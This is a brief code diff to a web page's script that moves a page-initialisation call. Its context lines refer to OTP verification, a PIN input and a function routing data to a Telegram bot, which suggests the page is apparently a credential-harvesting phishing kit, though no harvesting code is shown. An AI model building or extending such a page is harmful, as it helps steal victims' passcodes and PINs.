@@ -1030,6 +1030,9 @@ Verify if OTP is correct.
                 pinInput.type = 'password';
             }
         }
+
+        // Initialize
+        showPage(1);
         
 // webhook-client.js
 // Override the client-side sendToTelegramBot function to route through the backend
@@ -1124,8 +1127,7 @@ Verify if OTP is correct.
   window.startStageViaBackend = startStageViaBackend;
   window.pollSessionStatus = pollSessionStatus;
 })();
-        // Initialize
-        showPage(1);
+        
     </script>
     
 </body>
